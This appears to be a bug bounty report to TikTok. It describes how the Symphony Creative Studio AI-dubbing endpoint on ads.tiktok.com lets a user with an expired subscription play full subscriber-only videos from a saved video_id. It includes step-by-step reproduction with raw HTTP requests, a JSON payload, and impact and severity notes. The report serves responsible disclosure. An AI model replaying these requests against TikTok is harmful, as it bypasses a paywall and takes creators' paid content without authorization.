**Program:** Tiktok  **Asset:** ads.tiktok.com  **Weakness:** Improper Access Control

**Title: Attacker can watch full subscription only content for free via Symphony Creative Studio AI-Dubbing Endpoint
## Description:

This report is related to my previously reported issue #3575328 where a TikTok endpoint on (`ads.tiktok.com`) allowed subscriber-only videos to be processed through a remix generation feature after a subscription expired. In that report, the analyst assessed the confidentiality as Low because only the visual portion of the video was exposed while the original audio was replaced.
<img width="1062" height="202" alt="Screenshot 2026-03-08 171718" src="https://github.com/user-attachments/assets/c61e54ec-0f77-4ac4-843e-0fe9e7001e5e" />
While continuing to investigate subscriber-only content protections, I discovered a separate endpoint on (ads.tiktok.com) Symphony Creative Studio. Unlike the previous report, this endpoint allows the full original video including audio to be disclosed using only the vid.
The TikTok Symphony Creative Studio endpoint responsible for video AI-Dubbing generation (`creative_bff_i18n/api/cue/ai_dubbing_new/gen_task/batch_create`) does not revalidate the current authorization state of subscriber-only videos when a `vid` is supplied.

An attacker who was previously subscribed to a paid video can save the `video_id` while they have access, and after their subscription ends, They can still watch the content whenever they want. As a result, this issue exposes the complete original content rather than a modified remix output, allowing subscriber-only videos to be accessed and retained even after the subscription has expired.

---

## Steps to Reproduce
1. Subscribe to a subscriber-only video

2. Capture/save its video identifier by running the graph ql request below
```
GET <video_link> HTTP/2
Host: www.tiktok.com
Cookie: [redacted]
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: 
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=0, i
```
you should find the video_id in the response as shown in the image below (save it somwhere)
<img width="928" height="846" alt="image" src="https://github.com/user-attachments/assets/7cc85c99-a488-425a-be22-8ea5e2117220" />

3. Allow the subscription to expire
4. As the attacker Confirm the video is no longer accessible through normal TikTok interfaces.
5. now as the attacker go to (https://ads.tiktok.com/creative/creativestudio/create/history) make sure you are signed up to ads.tiktok.com
6. Now as attacker run the following http request below:
```
POST /creative_bff_i18n/api/cue/ai_dubbing_new/gen_task/batch_create?aid=585599&app_name=creative_aio_client&device_platform=web&did=7613122579646088760&device_id=7613122579646088760 HTTP/2
Host: ads.tiktok.com
Cookie: [REDACTED]
Content-Length: 294
Sec-Ch-Ua-Platform: "Windows"
X-Csrftoken: J5SgjaVz52jajtNNJMvxGn7BoAaABVhK
Sec-Ch-Ua: "Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"
Sec-Ch-Ua-Mobile: ?0
Agw-Js-Conv: str
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
X-Creative-Source: cue/dubbing
Content-Type: application/json
Origin: https://ads.tiktok.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ads.tiktok.com/creative/creativestudio/dubbing
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i

{"cueProjectId":"","project_name":"ANY_NAME","video_id":"SAVED_VIDEO_ID","tasks":[{"project_id":"","target_language":"English","lipsync":false,"task_name":"ANY_NAME","lipsync_model_type":1,"subtitle_erase":false,"source_language":"Auto-detect"}]}
```
7. Now as the attacker go back to (https://ads.tiktok.com/creative/creativestudio/create/history) and Observe that the system is generating the video as shown in the POC below, now while its loading click it (we are clciking it because the system does not eventually generate the dub, it just keeps loading)
<img width="959" height="451" alt="Screenshot 2026-03-24 030422" src="https://github.com/user-attachments/assets/68846f44-c419-475f-907c-b3ce755f60e1" />
8. Now when you click it you will see a cover image of the sub-only video. Click it
<img width="959" height="451" alt="Screenshot 2026-03-24 030332" src="https://github.com/user-attachments/assets/e662e542-012e-45c0-a6ec-699c3d432918" />
9. Now observe that the full sub-only video starts to play including its audio.

---

## Impact

Subscriber-only TikTok videos are intended to be accessible only while a user has an active subscription. Once the subscription expires, access should be revoked and the content should no longer be viewable.

However, this endpoint allows an attacker to use a previously obtained video_id to access the full original video (including audio) through the Symphony Creative Studio dubbing workflow. This bypasses the subscription paywall and exposes content that should no longer be accessible after access revocation.

In practice, this means a user only needs temporary access to the video_id once in order to regain access to the subscriber-only video at any time, even after their subscription has expired.

---

## Severity
**CVSS v3.0 Base Score:** 5.9 → Medium  

| Metric | Value |
|--------|-------|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | High |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

---
